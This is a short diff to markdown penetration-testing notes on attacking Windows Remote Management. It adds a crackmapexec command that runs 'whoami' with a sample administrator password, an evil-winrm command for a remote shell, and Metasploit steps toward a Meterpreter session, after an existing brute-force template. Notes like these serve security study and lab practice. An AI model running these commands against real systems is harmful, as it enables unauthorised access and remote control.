@@ -11,3 +11,14 @@ Tools:
 
 ## Performing Brute force attack with Crackmapexec  
 ```crackmapexec (protocol) (Target IP) -u (Username / word list) -p (password wordlist)```
+
+## Executing a command with crackmapexec  
+```crackmapexec winrm 10.4.21.151 -u administrator -p tinkerbell -x "whoami" ```
+
+## Evil-winrm to get command shell session  
+```evil-winrm.rb -u administrator -p 'password' -i (IP address)```
+
+## Meterpreter session
+```service postgresql start && msfconsole```  
+**Module**: winrm_script_exec  
+Set FORCE_VBS to true
